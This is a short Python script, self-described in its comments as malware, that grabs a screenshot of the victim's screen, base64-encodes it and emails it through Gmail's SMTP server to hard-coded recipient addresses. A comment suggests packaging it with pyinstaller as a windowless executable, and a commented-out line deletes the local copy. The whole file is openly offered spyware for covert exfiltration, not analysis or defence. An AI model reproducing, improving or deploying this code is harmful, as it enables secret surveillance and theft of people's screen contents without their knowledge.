


# This is another piece of virus/malicious code 

# this malware is able to grab screenshot og the victim machine 
# and send them to the attacker through the email-service like gmail../

import base64
import sys 

from PIL import ImageGrab 

from email.mime.text import MIMEtext
from email.mime.multipart import MIMEMultipart 

snapshort = ImageGrab.grab()
file = "screen.jpg"
snapshort.save(file)
import os
import smtplib

f=open('screen.jpg','rb')      #Open file in binary mode
data=f.read()
data=base64.b64encode(data) #Convert binary to base 64 
f.close()
#  file is also saved on the local machine 

# pyinstaller -w -F  .py
#os.remove(file) # removing the original fime ,,,, 


s = smtplib.SMTP('smtp.gmail.com', 587)   # smtp connection ....
s.starttls()
login_mail = input("please enter your mail-id")
login_pass = input("enter your mail password")
# [!]Remember! You need to enable 'Allow less secure apps' in your #google account
# Enter your gmail username and password
s.login(login_mail, login_pass) 
  
# message to be sent 
message = data # data variable has the base64 string of screenshot
  
# Sender email, recipient email 
s.sendmail("789sk.email@gmail.com", "1598.srk@gmail.com", message) 
s.quit()
